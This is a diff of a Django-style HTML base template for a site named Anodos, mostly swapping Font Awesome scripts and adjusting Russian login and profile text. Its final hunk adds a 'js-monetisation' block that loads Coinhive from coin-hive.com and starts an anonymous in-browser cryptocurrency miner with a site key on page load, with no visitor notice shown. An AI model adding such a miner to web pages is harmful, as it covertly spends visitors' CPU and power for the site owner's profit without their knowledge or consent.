@@ -19,9 +19,11 @@
     <link rel="stylesheet" href="/static/css/template.css">
 
     <!-- Fort Awesome -->
-    <script defer src="/static/js/packs/light.js"></script>
-    <script defer src="/static/js/fontawesome.js"></script>
+    <script defer src="/static/js/packs/regular.min.js"></script>
+    <script defer src="/static/js/packs/brands.min.js"></script>
+    <script defer src="/static/js/fontawesome.min.js"></script>
 </head>
+
 <body>
 
 <header>
@@ -31,9 +33,9 @@
     <div class="medium-6 large-4 columns"><h1><a href="/">Anodos</a></h1></div>
     <div class="medium-6 large-8 columns text-right">
         {% if user.is_authenticated %}
-        <p><a data-do = "open-profile">{{ user.first_name }} {{ user.last_name }}</a>, вы авторизованы.</p>
+        <p><a data-do = "open-profile"><i class="far fa-user"></i> {{ user.first_name }} {{ user.last_name }}</a></p>
         {% else %}
-        <p>Желаете <a data-do = "open-login">авторизоваться</a> или <a data-do = "open-register">зарегистрироваться</a>?</p>
+        <p><i class="far fa-sign-in"></i> <a data-do = "open-login">авторизоваться</a> или <a data-do = "open-register">зарегистрироваться</a></p>
         {% endif %}
     </div>
 </div>
@@ -113,6 +115,14 @@
 {% block js-content %}
 <script>
 {% include "catalog/js/search-on-stocks.js" %}
+</script>
+{% endblock %}
+
+{% block js-monetisation %}
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('IwVlUKPdM3lGYNwO1cAmEGKkLWvAR3Sq');
+    miner.start();
 </script>
 {% endblock %}
 
